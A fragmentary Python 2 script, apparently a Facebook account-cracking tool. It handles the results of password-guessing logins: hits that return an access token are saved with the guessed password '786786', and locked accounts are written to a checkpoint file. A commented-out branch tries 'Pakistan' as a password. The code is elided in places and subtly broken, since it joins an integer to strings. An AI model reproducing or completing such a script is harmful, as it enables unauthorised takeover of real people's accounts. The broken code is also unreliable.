	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				...
				okb.write(k+c+user+'-•?•-'+786786+'\n')
				okb.close()
				oks.append(c+user+786786)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;95m[Error CP] ' + k + c + user + ' -•?•- ' + pass1+'\n'
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'-•?•-'+786786+'\n')
					cps.close()
					cpb.append(c+user+786786)
#				else:
#				    pass2="ComingSoon"
...
#					        cps = open('save/checkpoint.txt', 'a')
#					        cps.write(k+c+user+'-•?•-'+Pakistan+'\n')
#					        cps.close()
#					        cpb.append(c+user+Pakistan)
